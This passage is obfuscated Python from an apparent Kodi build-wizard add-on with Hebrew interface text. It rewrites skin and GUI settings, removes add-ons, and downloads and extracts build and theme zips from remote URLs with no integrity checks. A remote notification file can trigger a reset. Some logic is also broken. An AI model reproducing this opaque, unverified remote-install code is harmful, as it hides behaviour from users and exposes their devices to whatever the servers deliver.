			OO0OOO00OO0OO0000 .write (O000O0OO0OOO0OOO0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOO00O0O0OO0000O0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3867
			OO0OOO00OO0OO0000 .close ()#line:3868
		except :#line:3869
				pass #line:3870
		swapSkins ('skin.Premium.mod')#line:3871
def fix18update ():#line:3873
	if KODIV >=18 :#line:3874
		xbmc .sleep (4000 )#line:3875
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3876
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3877
		fixfont ()#line:3878
		O000OO0OOOOOO00OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3879
		try :#line:3880
			OOO0000OOO0000000 =open (O000OO0OOOOOO00OO ,'r')#line:3881
			OOO00O000OOOOOOO0 =OOO0000OOO0000000 .read ()#line:3882
			OOO0000OOO0000000 .close ()#line:3883
			OOO00OOO0000OOO00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3884
			OO0O000OO0000OOOO =re .compile (OOO00OOO0000OOO00 ).findall (OOO00O000OOOOOOO0 )[0 ]#line:3885
			OOO0000OOO0000000 =open (O000OO0OOOOOO00OO ,'w')#line:3886
			OOO0000OOO0000000 .write (OOO00O000OOOOOOO0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO0O000OO0000OOOO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3887
			OOO0000OOO0000000 .close ()#line:3888
		except :#line:3889
				pass #line:3890
		wiz .kodi17Fix ()#line:3891
		O000OO0OOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3892
		try :#line:3893
			OOO0000OOO0000000 =open (O000OO0OOOOOO00OO ,'r')#line:3894
			OOO00O000OOOOOOO0 =OOO0000OOO0000000 .read ()#line:3895
			OOO0000OOO0000000 .close ()#line:3896
			OOO00OOO0000OOO00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3897
			OO0O000OO0000OOOO =re .compile (OOO00OOO0000OOO00 ).findall (OOO00O000OOOOOOO0 )[0 ]#line:3898
			OOO0000OOO0000000 =open (O000OO0OOOOOO00OO ,'w')#line:3899
			OOO0000OOO0000000 .write (OOO00O000OOOOOOO0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO0O000OO0000OOOO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3900
			OOO0000OOO0000000 .close ()#line:3901
		except :#line:3902
				pass #line:3903
		swapSkins ('skin.Premium.mod')#line:3904
def buildWizard (O0OOOO00OO0O0O0O0 ,O0O0OO000O000O000 ,theme =None ,over =False ):#line:3907
	if over ==False :#line:3908
		O000O0O0OO000O000 =wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'url')#line:3909
		if O000O0O0OO000O000 ==False :#line:3911
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3916
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3917
			return #line:3918
		OO00OO0O0O00O00OO =wiz .workingURL (O000O0O0OO000O000 )#line:3919
		if OO00OO0O0O00O00OO ==False :#line:3920
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO00OO0O0O00O00OO ))#line:3921
			return #line:3922
	if O0O0OO000O000O000 =='gui':#line:3923
		if O0OOOO00OO0O0O0O0 ==BUILDNAME :#line:3924
			if over ==True :OO000OO0O0O00O0OO =1 #line:3925
			else :OO000OO0O0O00O0OO =1 #line:3926
		else :#line:3927
			OO000OO0O0O00O0OO =1 #line:3928
		if OO000OO0O0O00O0OO :#line:3929
			remove_addons ()#line:3930
			remove_addons2 ()#line:3931
			O0OOOOOOO000O0000 =wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'gui')#line:3932
			O000O0OOO0O00O000 =O0OOOO00OO0O0O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3933
			if not wiz .workingURL (O0OOOOOOO000O0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3934
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3935
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00OO0O0O0O0 ),'','אנא המתן')#line:3936
			O0O0000OOOOO00O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000O0OOO0O00O000 )#line:3937
			try :os .remove (O0O0000OOOOO00O00 )#line:3938
			except :pass #line:3939
			logging .warning (O0OOOOOOO000O0000 )#line:3940
			if 'google'in O0OOOOOOO000O0000 :#line:3941
			   OOO0O0OOO0O00OO0O =googledrive_download (O0OOOOOOO000O0000 ,O0O0000OOOOO00O00 ,DP ,wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'filesize'))#line:3942
			else :#line:3945
			  downloader .download (O0OOOOOOO000O0000 ,O0O0000OOOOO00O00 ,DP )#line:3946
			xbmc .sleep (100 )#line:3947
			OOOO00O0OO0000OOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00OO0O0O0O0 )#line:3948
			DP .update (0 ,OOOO00O0OO0000OOO ,'','אנא המתן')#line:3949
			extract .all (O0O0000OOOOO00O00 ,HOME ,DP ,title =OOOO00O0OO0000OOO )#line:3950
			DP .close ()#line:3951
			wiz .defaultSkin ()#line:3952
			wiz .lookandFeelData ('save')#line:3953
			wiz .kodi17Fix ()#line:3954
			if KODIV >=18 :#line:3955
				skindialogsettind18 ()#line:3956
			if INSTALLMETHOD ==1 :O0OOOO0OO0O000OO0 =1 #line:3958
			elif INSTALLMETHOD ==2 :O0OOOO0OO0O000OO0 =0 #line:3959
			else :DP .close ()#line:3960
			OO000O0O00OO0OO00 =(NOTIFICATION )#line:3961
			O0O000O0OOOO0OO00 =urllib2 .urlopen (OO000O0O00OO0OO00 )#line:3962
			O0OO00O00OOOO00O0 =O0O000O0OOOO0OO00 .readlines ()#line:3963
			O0O0000O0OOOO0O00 =0 #line:3964
			for O0OO0OOO0OOOO0O0O in O0OO00O00OOOO00O0 :#line:3967
				if O0OO0OOO0OOOO0O0O .split (' ==')[0 ]=="noreset"or O0OO0OOO0OOOO0O0O .split ()[0 ]=="noreset":#line:3968
					xbmc .executebuiltin ("ReloadSkin()")#line:3970
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3971
					update_Votes ()#line:3972
					indicatorfastupdate ()#line:3973
				if O0OO0OOO0OOOO0O0O .split (' ==')[0 ]=="reset"or O0OO0OOO0OOOO0O0O .split ()[0 ]=="reset":#line:3974
					update_Votes ()#line:3976
					indicatorfastupdate ()#line:3977
					resetkodi ()#line:3978
		else :#line:3987
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3988
	if O0O0OO000O000O000 =='gui2':#line:3989
		if O0OOOO00OO0O0O0O0 ==BUILDNAME :#line:3990
			if over ==True :OO000OO0O0O00O0OO =1 #line:3991
			else :OO000OO0O0O00O0OO =1 #line:3992
		else :#line:3993
			OO000OO0O0O00O0OO =1 #line:3994
		if OO000OO0O0O00O0OO :#line:3995
			remove_addons ()#line:3996
			remove_addons2 ()#line:3997
			O0OOOOOOO000O0000 =wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'gui')#line:3998
			O000O0OOO0O00O000 =O0OOOO00OO0O0O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3999
			if not wiz .workingURL (O0OOOOOOO000O0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4000
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4001
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00OO0O0O0O0 ),'','אנא המתן')#line:4002
			O0O0000OOOOO00O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000O0OOO0O00O000 )#line:4003
			try :os .remove (O0O0000OOOOO00O00 )#line:4004
			except :pass #line:4005
			logging .warning (O0OOOOOOO000O0000 )#line:4006
			if 'google'in O0OOOOOOO000O0000 :#line:4007
			   OOO0O0OOO0O00OO0O =googledrive_download (O0OOOOOOO000O0000 ,O0O0000OOOOO00O00 ,DP ,wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'filesize'))#line:4008
			else :#line:4011
			  downloader .download (O0OOOOOOO000O0000 ,O0O0000OOOOO00O00 ,DP )#line:4012
			xbmc .sleep (100 )#line:4013
			OOOO00O0OO0000OOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00OO0O0O0O0 )#line:4014
			DP .update (0 ,OOOO00O0OO0000OOO ,'','אנא המתן')#line:4015
			extract .all (O0O0000OOOOO00O00 ,HOME ,DP ,title =OOOO00O0OO0000OOO )#line:4016
			DP .close ()#line:4017
			wiz .defaultSkin ()#line:4018
			wiz .lookandFeelData ('save')#line:4019
			if INSTALLMETHOD ==1 :O0OOOO0OO0O000OO0 =1 #line:4022
			elif INSTALLMETHOD ==2 :O0OOOO0OO0O000OO0 =0 #line:4023
			else :DP .close ()#line:4024
		else :#line:4026
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4027
	elif O0O0OO000O000O000 =='fresh':#line:4028
		freshStart (O0OOOO00OO0O0O0O0 )#line:4029
	elif O0O0OO000O000O000 =='normal':#line:4030
		if OO000O0O00OO0OO00 =='normal':#line:4031
			if KEEPTRAKT =='true':#line:4032
				traktit .autoUpdate ('all')#line:4033
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4034
			if KEEPREAL =='true':#line:4035
				debridit .autoUpdate ('all')#line:4036
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4037
			if KEEPLOGIN =='true':#line:4038
				loginit .autoUpdate ('all')#line:4039
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4040
		OOOOOO0O00OO0O000 =int (KODIV );O0OOOO00O0O0OOOO0 =int (float (wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'kodi')))#line:4041
		if not OOOOOO0O00OO0O000 ==O0OOOO00O0O0OOOO0 :#line:4042
			if OOOOOO0O00OO0O000 ==16 and O0OOOO00O0O0OOOO0 <=15 :O0OO0O000O00000O0 =False #line:4043
			else :O0OO0O000O00000O0 =True #line:4044
		else :O0OO0O000O00000O0 =False #line:4045
		if O0OO0O000O00000O0 ==True :#line:4046
			OOOOOOO0OOOOO0OO0 =1 #line:4047
		else :#line:4048
			if not over ==False :OOOOOOO0OOOOO0OO0 =1 #line:4049
			else :OOOOOOO0OOOOO0OO0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4050
		if OOOOOOO0OOOOO0OO0 :#line:4051
			wiz .clearS ('build')#line:4052
			O0OOOOOOO000O0000 =wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'url')#line:4053
			O000O0OOO0O00O000 =O0OOOO00OO0O0O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4054
			if not wiz .workingURL (O0OOOOOOO000O0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4055
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4056
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O0OOOO00OO0O0O0O0 ,wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'version')),'','אנא המתן')#line:4057
			O0O0000OOOOO00O00 =os .path .join (PACKAGES ,'%s.zip'%O000O0OOO0O00O000 )#line:4058
			try :os .remove (O0O0000OOOOO00O00 )#line:4059
			except :pass #line:4060
			logging .warning (O0OOOOOOO000O0000 )#line:4061
			if 'google'in O0OOOOOOO000O0000 :#line:4062
			   OOO0O0OOO0O00OO0O =googledrive_download (O0OOOOOOO000O0000 ,O0O0000OOOOO00O00 ,DP ,wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'filesize'))#line:4063
			else :#line:4066
			  downloader .download (O0OOOOOOO000O0000 ,O0O0000OOOOO00O00 ,DP )#line:4067
			xbmc .sleep (1000 )#line:4068
			OOOO00O0OO0000OOO ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00OO0O0O0O0 ,wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'version'))#line:4069
			DP .update (0 ,OOOO00O0OO0000OOO ,'','אנא המתן...')#line:4070
			OO0OOO0OO0OOO000O ,O000O00OO00OOO000 ,O00OO000OOOOOOO0O =extract .all (O0O0000OOOOO00O00 ,HOME ,DP ,title =OOOO00O0OO0000OOO )#line:4071
			if int (float (OO0OOO0OO0OOO000O ))>0 :#line:4072
				try :#line:4073
					wiz .fixmetas ()#line:4074
				except :pass #line:4075
				wiz .lookandFeelData ('save')#line:4076
				wiz .defaultSkin ()#line:4077
				wiz .setS ('buildname',O0OOOO00OO0O0O0O0 )#line:4079
				wiz .setS ('buildversion',wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'version'))#line:4080
				wiz .setS ('buildtheme','')#line:4081
				wiz .setS ('latestversion',wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'version'))#line:4082
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4083
				wiz .setS ('installed','true')#line:4084
				wiz .setS ('extract',str (OO0OOO0OO0OOO000O ))#line:4085
				wiz .setS ('errors',str (O000O00OO00OOO000 ))#line:4086
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO0OOO0OO0OOO000O ,O000O00OO00OOO000 ))#line:4087
				fastupdatefirstbuild (NOTEID )#line:4088
				wiz .kodi17Fix ()#line:4089
				skin_homeselect ()#line:4090
				skin_lower ()#line:4091
				rdbuildinstall ()#line:4092
				try :gaiaserenaddon ()#line:4093
				except :pass #line:4094
				adults18 ()#line:4095
				skinfix18 ()#line:4096
				try :os .remove (O0O0000OOOOO00O00 )#line:4098
				except :pass #line:4099
				O0OOOOOO0O0000OOO =(ADDON .getSetting ("auto_rd"))#line:4100
				if O0OOOOOO0O0000OOO =='true':#line:4101
					try :#line:4102
						setautorealdebrid ()#line:4103
					except :pass #line:4104
				try :#line:4105
					autotrakt ()#line:4106
				except :pass #line:4107
				O0OOOOO00O000000O =(ADDON .getSetting ("imdb_on"))#line:4108
				if O0OOOOO00O000000O =='true':#line:4109
					imdb_synck ()#line:4110
				iptvset ()#line:4111
				DP .close ()#line:4119
				O0O00OO0O0O000000 =wiz .themeCount (O0OOOO00OO0O0O0O0 )#line:4120
				builde_Votes ()#line:4121
				indicator ()#line:4122
				if not O0O00OO0O0O000000 ==False :#line:4123
					buildWizard (O0OOOO00OO0O0O0O0 ,'theme')#line:4124
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4125
				if INSTALLMETHOD ==1 :O0OOOO0OO0O000OO0 =1 #line:4126
				elif INSTALLMETHOD ==2 :O0OOOO0OO0O000OO0 =0 #line:4127
				else :resetkodi ()#line:4128
				if O0OOOO0OO0O000OO0 ==1 :wiz .reloadFix ()#line:4130
				else :wiz .killxbmc (True )#line:4131
			else :#line:4132
				if isinstance (O000O00OO00OOO000 ,unicode ):#line:4133
					O00OO000OOOOOOO0O =O00OO000OOOOOOO0O .encode ('utf-8')#line:4134
				O0O0O00OO0OO00O00 =open (O0O0000OOOOO00O00 ,'r')#line:4135
				O0O00O0OO00OOO00O =O0O0O00OO0OO00O00 .read ()#line:4136
				O0O0O0O000O00O0O0 =''#line:4137
				for OO000O000O000O0OO in OOO0O0OOO0O00OO0O :#line:4138
				  O0O0O0O000O00O0O0 ='key: '+O0O0O0O000O00O0O0 +'\n'+OO000O000O000O0OO #line:4139
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O00OO000OOOOOOO0O +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0O0O0O000O00O0O0 )#line:4140
		else :#line:4141
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4142
	elif O0O0OO000O000O000 =='theme':#line:4143
		if theme ==None :#line:4144
			O0O00OO0O0O000000 =wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'theme')#line:4145
			OO0OO0000O00OO000 =[]#line:4146
			if not O0O00OO0O0O000000 =='http://'and wiz .workingURL (O0O00OO0O0O000000 )==True :#line:4147
				OO0OO0000O00OO000 =wiz .themeCount (O0OOOO00OO0O0O0O0 ,False )#line:4148
				if len (OO0OO0000O00OO000 )>0 :#line:4149
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0OOOO00OO0O0O0O0 ,COLOR1 ,len (OO0OO0000O00OO000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4150
						wiz .log ("Theme List: %s "%str (OO0OO0000O00OO000 ))#line:4151
						OOO00OO000000OO00 =DIALOG .select (ADDONTITLE ,OO0OO0000O00OO000 )#line:4152
						wiz .log ("Theme install selected: %s"%OOO00OO000000OO00 )#line:4153
						if not OOO00OO000000OO00 ==-1 :theme =OO0OO0000O00OO000 [OOO00OO000000OO00 ];O00O000O0O0OO000O =True #line:4154
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4155
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4156
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4157
		else :O00O000O0O0OO000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0OOOO00OO0O0O0O0 ,wiz .checkBuild (O0OOOO00OO0O0O0O0 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4158
		if O00O000O0O0OO000O :#line:4159
			OO0000OOOO0000O00 =wiz .checkTheme (O0OOOO00OO0O0O0O0 ,theme ,'url')#line:4160
			O000O0OOO0O00O000 =O0OOOO00OO0O0O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4161
			if not wiz .workingURL (OO0000OOOO0000O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4162
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4163
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4164
			O0O0000OOOOO00O00 =os .path .join (PACKAGES ,'%s.zip'%O000O0OOO0O00O000 )#line:4165
			try :os .remove (O0O0000OOOOO00O00 )#line:4166
			except :pass #line:4167
			downloader .download (OO0000OOOO0000O00 ,O0O0000OOOOO00O00 ,DP )#line:4168
			xbmc .sleep (1000 )#line:4169
			DP .update (0 ,"","Installing %s "%O0OOOO00OO0O0O0O0 )#line:4170
			OO00OO00OOOO0O0OO =False #line:4171
			if OO000O0O00OO0OO00 not in ["fresh","normal"]:#line:4172
				OO00OO00OOOO0O0OO =testTheme (O0O0000OOOOO00O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4173
				O00OO0O0O00O00000 =testGui (O0O0000OOOOO00O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4174
				if OO00OO00OOOO0O0OO ==True :#line:4175
					wiz .lookandFeelData ('save')#line:4176
					O0OO00O00O0O0OO0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4177
					O0OOO000O0O00O0O0 =xbmc .getSkinDir ()#line:4178
					skinSwitch .swapSkins (O0OO00O00O0O0OO0O )#line:4180
					O0OO00O00OOOO00O0 =0 #line:4181
					xbmc .sleep (1000 )#line:4182
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO00O00OOOO00O0 <150 :#line:4183
						O0OO00O00OOOO00O0 +=1 #line:4184
						xbmc .sleep (1000 )#line:4185
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4186
						wiz .ebi ('SendClick(11)')#line:4187
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4188
					xbmc .sleep (1000 )#line:4189
			OOOO00O0OO0000OOO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4190
			DP .update (0 ,OOOO00O0OO0000OOO ,'','אנא המתן')#line:4191
			OO0OOO0OO0OOO000O ,O000O00OO00OOO000 ,O00OO000OOOOOOO0O =extract .all (O0O0000OOOOO00O00 ,HOME ,DP ,title =OOOO00O0OO0000OOO )#line:4192
			wiz .setS ('buildtheme',theme )#line:4193
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO0OOO0OO0OOO000O ,O000O00OO00OOO000 ))#line:4194
			DP .close ()#line:4195
			if OO000O0O00OO0OO00 not in ["fresh","normal"]:#line:4196
				wiz .forceUpdate ()#line:4197
				if KODIV >=17 :wiz .kodi17Fix ()#line:4198
				if O00OO0O0O00O00000 ==True :#line:4199
					wiz .lookandFeelData ('save')#line:4200
					wiz .defaultSkin ()#line:4201
					O0OOO000O0O00O0O0 =wiz .getS ('defaultskin')#line:4202
					skinSwitch .swapSkins (O0OOO000O0O00O0O0 )#line:4203
					O0OO00O00OOOO00O0 =0 #line:4204
					xbmc .sleep (1000 )#line:4205
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO00O00OOOO00O0 <150 :#line:4206
						O0OO00O00OOOO00O0 +=1 #line:4207
						xbmc .sleep (1000 )#line:4208
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4210
						wiz .ebi ('SendClick(11)')#line:4211
					wiz .lookandFeelData ('restore')#line:4212
				elif OO00OO00OOOO0O0OO ==True :#line:4213
					skinSwitch .swapSkins (O0OOO000O0O00O0O0 )#line:4214
					O0OO00O00OOOO00O0 =0 #line:4215
					xbmc .sleep (1000 )#line:4216
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO00O00OOOO00O0 <150 :#line:4217
						O0OO00O00OOOO00O0 +=1 #line:4218
						xbmc .sleep (1000 )#line:4219
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4221
						wiz .ebi ('SendClick(11)')#line:4222
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4223
					wiz .lookandFeelData ('restore')#line:4224
				else :#line:4225
					wiz .ebi ("ReloadSkin()")#line:4226
					xbmc .sleep (1000 )#line:4227
					wiz .ebi ("Container.Refresh")#line:4228
		else :#line:4229
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4230
def skin_homeselect ():#line:4234
	try :#line:4236
		OO0O0O0OO0O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4237
		OO00OOOO000O000OO =open (OO0O0O0OO0O0OOOOO ,'r')#line:4239
		O00OO0O00OOO0O00O =OO00OOOO000O000OO .read ()#line:4240
		OO00OOOO000O000OO .close ()#line:4241
		OOO0O00OOOOOOO0OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4242
		O0OOO0OO0O0O0OOOO =re .compile (OOO0O00OOOOOOO0OO ).findall (O00OO0O00OOO0O00O )[0 ]#line:4243
		OO00OOOO000O000OO =open (OO0O0O0OO0O0OOOOO ,'w')#line:4244
		OO00OOOO000O000OO .write (O00OO0O00OOO0O00O .replace ('<setting id="HomeS" type="string%s/setting>'%O0OOO0OO0O0O0OOOO ,'<setting id="HomeS" type="string"></setting>'))#line:4245
		OO00OOOO000O000OO .close ()#line:4246
	except :#line:4247
		pass #line:4248
def skin_lower ():#line:4251
	O0OO0OOO00OOO0O00 =(ADDON .getSetting ("lower"))#line:4252
	if O0OO0OOO00OOO0O00 =='true':#line:4253
		try :#line:4256
			O0O0O000OOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4257
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'r')#line:4259
			O00OO0O00O00OOO0O =O0O0O000OOOO0OO00 .read ()#line:4260
			O0O0O000OOOO0OO00 .close ()#line:4261
			O00OO0OO00OO0OO0O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4262
			O0OO0OO00O0O00O00 =re .compile (O00OO0OO00OO0OO0O ).findall (O00OO0O00O00OOO0O )[0 ]#line:4263
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'w')#line:4264
			O0O0O000OOOO0OO00 .write (O00OO0O00O00OOO0O .replace ('<setting id="none_widget" type="bool%s/setting>'%O0OO0OO00O0O00O00 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4265
			O0O0O000OOOO0OO00 .close ()#line:4266
			O0O0O000OOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4268
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'r')#line:4270
			O00OO0O00O00OOO0O =O0O0O000OOOO0OO00 .read ()#line:4271
			O0O0O000OOOO0OO00 .close ()#line:4272
			O00OO0OO00OO0OO0O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4273
			O0OO0OO00O0O00O00 =re .compile (O00OO0OO00OO0OO0O ).findall (O00OO0O00O00OOO0O )[0 ]#line:4274
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'w')#line:4275
			O0O0O000OOOO0OO00 .write (O00OO0O00O00OOO0O .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0OO0OO00O0O00O00 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4276
			O0O0O000OOOO0OO00 .close ()#line:4277
			O0O0O000OOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4279
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'r')#line:4281
			O00OO0O00O00OOO0O =O0O0O000OOOO0OO00 .read ()#line:4282
